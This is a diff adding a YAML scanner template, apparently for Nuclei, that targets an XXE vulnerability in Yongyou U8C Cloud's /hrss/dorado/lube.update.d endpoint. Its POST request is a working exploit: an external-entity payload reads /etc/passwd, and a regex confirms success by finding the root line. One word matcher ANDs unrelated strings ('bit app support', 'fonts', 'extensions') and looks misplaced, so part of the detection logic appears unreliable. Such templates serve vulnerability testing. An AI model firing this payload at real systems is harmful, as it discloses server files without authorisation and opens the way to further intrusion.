@@ -1,0 +1,33 @@
+id: poc-yaml-yongyou-u8c-cloud-update-xxe
+info:
+  name: Yongyou U8C Cloud XXE Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: xxe
+http:
+  - raw:
+      - |
+        GET /hrss/dorado/lube.update.d?__rpc=true&__rpcAgent=true HTTP/1.1
+        Host: {{Hostname}}
+    matchers:
+      - type: status
+        status:
+          - 200
+  - raw:
+      - |
+        POST /hrss/dorado/lube.update.d?__rpc=true&__rpcAgent=true HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        __type=updateData&__viewInstanceId=nc.bs.hrss.rm.ResetPassword~nc.bs.hrss.rm.ResetPasswordViewModel&__xml=<!DOCTYPE z [<!ENTITY test SYSTEM "file:///etc/passwd" >]><rpc transaction="10" method="resetPwd"><def><dataset type="Custom" id="dsResetPwd"><f name="user"></f></dataset></def><data><rs dataset="dsResetPwd"><r id="10008" state="insert"><n><v>1</v></n></r></rs></data><vps><p name="__profileKeys">%26test;</p></vps></rpc>&1404976068948
+    matchers-condition: or
+    matchers:
+      - type: word
+        words:
+          - "bit app support"
+          - "fonts"
+          - "extensions"
+        condition: and
+      - type: regex
+        regex:
+          - "root:.*:0:0:"
